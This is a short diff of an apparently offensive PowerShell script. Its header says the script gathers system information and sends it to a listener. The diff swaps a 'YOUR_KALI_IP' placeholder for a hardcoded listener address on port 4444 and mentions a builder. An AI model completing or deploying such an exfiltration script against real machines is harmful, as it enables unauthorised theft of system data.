@@ -1,7 +1,7 @@
 # This script gathers system information and sends it to a listener.
 
 # --- Configuration ---
-$ListenerIP = "YOUR_KALI_IP" # <-- IMPORTANT: Change this to your Kali's IP address
+$ListenerIP = "10.46.70.32" # This will be replaced by the builder
 $ListenerPort = "4444"       # <-- IMPORTANT: Change this to your listener's port
 
 # --- Information Gathering ---
